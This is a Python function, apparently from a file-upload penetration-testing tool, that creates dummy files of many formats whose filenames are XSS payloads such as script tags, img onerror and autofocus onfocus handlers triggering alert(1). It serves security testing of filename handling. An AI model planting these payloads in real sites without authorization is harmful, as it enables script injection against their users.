from pathlib import Path
from PIL import Image

def generate_xss_filename_payloads(output_dir, ext, burp_collab, tech_filter='all'):
    """
    Génère des fichiers avec des noms de fichiers XSS pour tester l'injection via nom de fichier
    
    Args:
        output_dir: Répertoire de sortie
        ext: Extension ('pdf', 'png', 'jpg', 'svg', 'xml', 'html', etc.)
        burp_collab: URL Burp Collaborator (non utilisé pour XSS mais gardé pour cohérence)
        tech_filter: Filtre backend (ignoré pour les noms de fichiers, on génère tout)
    """
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    
    xss_dir = output_dir / 'xss'
    xss_dir.mkdir(exist_ok=True)
    
    xss_filenames = [
        ('<script>alert(1)</script>', 'Script tag classique'),
        ('<img src=x onerror=alert(1)>', 'Image avec onerror'),
        ('<svg onload=alert(1)>', 'SVG avec onload'),
        ('javascript:alert(1)', 'JavaScript protocol'),
        ('<body onload=alert(1)>', 'Body avec onload'),
        ('<iframe src=javascript:alert(1)>', 'Iframe avec javascript:'),
        ('<input autofocus onfocus=alert(1)>', 'Input avec autofocus et onfocus'),
        ('<select onfocus=alert(1) autofocus>', 'Select avec autofocus et onfocus'),
        ('<textarea onfocus=alert(1) autofocus>', 'Textarea avec autofocus et onfocus'),
        ('<keygen onfocus=alert(1) autofocus>', 'Keygen avec autofocus et onfocus'),
    ]
    
    for filename_template, description in xss_filenames:
        filename = f"{filename_template}.{ext}"
        file_path = xss_dir / filename
        
        try:
            if ext in ['png', 'jpg', 'jpeg', 'gif']:
                img = Image.new('RGB', (10, 10), color='white')
                if ext == 'gif':
                    img.save(file_path, 'GIF')
                elif ext in ['jpg', 'jpeg']:
                    img.save(file_path, 'JPEG')
                else:
                    img.save(file_path, 'PNG')
            elif ext == 'pdf':
                pdf_content = '''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
100
%%EOF'''
                file_path.write_text(pdf_content)
            elif ext == 'svg':
                content = '<svg xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100"/></svg>'
                file_path.write_text(content)
            elif ext == 'xml':
                content = '<?xml version="1.0"?><root><test>XSS filename test</test></root>'
                file_path.write_text(content)
            elif ext in ['html', 'htm']:
                content = '<html><body>XSS filename test</body></html>'
                file_path.write_text(content)
            elif ext in ['docx', 'xlsx', 'pptx', 'odt', 'ods', 'odp']:
                from zipfile import ZipFile
                with ZipFile(file_path, 'w') as zf:
                    zf.writestr('test.txt', 'XSS filename test')
            elif ext in ['zip', 'jar', 'epub']:
                from zipfile import ZipFile
                with ZipFile(file_path, 'w') as zf:
                    zf.writestr('test.txt', 'XSS filename test')
            elif ext in ['webm', 'mp4']:
                file_path.write_bytes(b'\x1a\x45\xdf\xa3')
            elif ext in ['txt', 'csv', 'rtf', 'md', 'markdown']:
                file_path.write_text(f"XSS filename test: {filename_template}")
            else:
                file_path.write_text(f"XSS filename test: {filename_template}")
        except Exception as e:
            pass

